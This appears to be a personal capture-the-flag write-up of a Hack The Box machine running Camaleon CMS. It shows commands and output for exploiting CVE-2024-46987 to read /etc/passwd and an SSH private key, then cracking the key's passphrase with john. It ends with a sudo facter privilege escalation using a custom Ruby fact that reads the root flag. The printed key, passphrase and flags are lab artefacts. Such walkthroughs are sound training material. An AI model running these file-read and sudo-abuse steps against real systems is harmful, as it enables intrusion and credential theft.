
The given the ip address is : `10.129.9.154`

And i start to use the nmap of the ip ,
```
nmap -sV 10.129.9.154
```

is shows the open service available 
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 22:51 IST
Nmap scan report for 10.129.9.154
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds

```

and we don't have the ssh creds , but the port 22 http port is open 
`http://10.129.9.154/`

it shows that facts.htb while using the curl -v http://10.129.9.154/
`Location: http://facts.htb/`

so , i open the browser and type `http://facts.htb/`

I came to know that it is Camaleon CMS , it is a content-management system similar to the WordPress , and then i started to search any CVE related to that , i found the github like 
`https://github.com/Goultarde/CVE-2024-46987`

and then clone the repo and go into the repo , for this cve to execute we need the valid user , for that i register with the username mithun and password mithun1234 and then run the CVE using the payload 
```
python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false

```

Well it worked , and i need to know the creds of the ssh to login and get the userflag and root flag 
so , i begin to search for any creds for ssh

I search again and again , i used the commands .
```
python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /home/trivia/user.txt

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /home/trivia/.ssh/id_rsa

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /home/william/.ssh/id_rsa

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /proc/self/environ

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /proc/self/cmdline

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /home/trivia/app/config/database.yml

┌──(venv)─(mithun㉿vbox)-[~/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /var/www/facts/config/database.yml

```

but no output ,

for this payload ,
```
python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 /etc/nginx/sites-enabled/default
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        if ($host != facts.htb) {
                rewrite ^ http://facts.htb/;
        }


        root /var/www/html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

}

```

i found the root dir is `root /var/www/html`

finally i get the id ,
```
 python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 -v /home/trivia/.ssh/authorized_keys

[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKgRXe67Y7O3W3DsGzs7GH1ybCxpEllTD4eCBG+yVJo5 

```

and by using the command i get the rsa key,
```
python3 CVE-2024-46987.py -u http://facts.htb -l mithun -p mithun1234 -v /home/trivia/.ssh/id_ed25519
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBa0UThgZ
W0Bx5EFjnDYcn9AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIKgRXe67Y7O3W3Ds
Gzs7GH1ybCxpEllTD4eCBG+yVJo5AAAAoHmiMyJr7W7vLKFPiwrpTgFTe1pZlWZM5XZC6x
BC8jiheeHx8aXqMxl1dvoB1KSZqsoWpbR+tC9w8h8V/kPKQqOfHSv99WAF9ZBZC66XwRtS
qvMtHmzi8fdUen00y53oR12rlBCGg8DRk++ovQrdTfhkvN2QE8yuIpydckesthGcoVMyjk
SApp4EdxzADvBXI/Dg4ClE0FPuAo8YGhAtkOc=
-----END OPENSSH PRIVATE KEY-----

```

with the john and the with the filename rockyou.txt i cracked the hash
```
john trivia_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (trivia_key)     
1g 0:00:02:24 DONE (2026-03-18 23:46) 0.006927g/s 22.16p/s 22.16c/s 22.16C/s sharks..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

the password is `dragonballz`

and then i login in trivia_key using the ssh , `ssh -i trivia_key trivia@10.129.9.154`
and with the pass dragonballz

and then i log-in and then there is no file named user.txt and at the first we found the user root,trivia_key,, william and so i search any user.txt in william , by lucky we have the user.txt in /home/william , so i used the command `cat /home/william/user.txt`

`User.txt = 5a2d611041d58010e82ff6ecd48cc6de`

and we need the root.txt flag , for that used the command ,

```
mkdir /tmp/facts

cat > /tmp/facts/evil.rb << 'EOF'
Facter.add('evil') do
  setcode do
    `cat /root/root.txt`
  end
end
EOF

trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/facts evil
1b5da3a0643ff233ae50f521858d4b1f
```

and got ` Root.txt = 1b5da3a0643ff233ae50f521858d4b1f`

------------

## What is facter ??

The facter is root access , it can do everything as the admin , so what we did is , create a dir , and write the ruby code and it has the 'cat /root/root.txt' why the ` '' ` is because the text inside the 
'  '  will execute as the shell command , so the facter will try to read the file and then print the root.txt so that the machine called facts 

and the command is `sudo /usr/bin/facter --custom-dir /tmp/facts evil` is 
```
sudo /usr/bin/facter --custom-dir /tmp/facts evil
```

---

### Each Part Explained:
```
sudo                  → Run as ROOT
/usr/bin/facter       → The facter program
--custom-dir          → A FLAG that says "load facts from this folder"
/tmp/facts            → OUR folder (where we put evil.rb)
evil                  → The name of the fact to run
```

---

### What is `--custom-dir`?

Facter normally loads facts from its **own trusted folders:**
```
/etc/facter/facts.d/     ← official facts folder
/etc/puppetlabs/facts/   ← official facts folder
```

But `--custom-dir` says:
```
"Hey facter, ALSO load facts from THIS folder"
         ↓
We give it /tmp/facts   ← OUR malicious folder
```


### SSH Always Stores Keys in the SAME Place:

```
Linux SSH Key Locations are ALWAYS:

/home/USERNAME/.ssh/id_rsa          ← RSA private key
/home/USERNAME/.ssh/id_ed25519      ← ED25519 private key
/home/USERNAME/.ssh/id_ecdsa        ← ECDSA private key
/home/USERNAME/.ssh/authorized_keys ← allowed public keys
/home/USERNAME/.ssh/known_hosts     ← known servers

This is STANDARD on every Linux system!
Not specific to this machine.
```

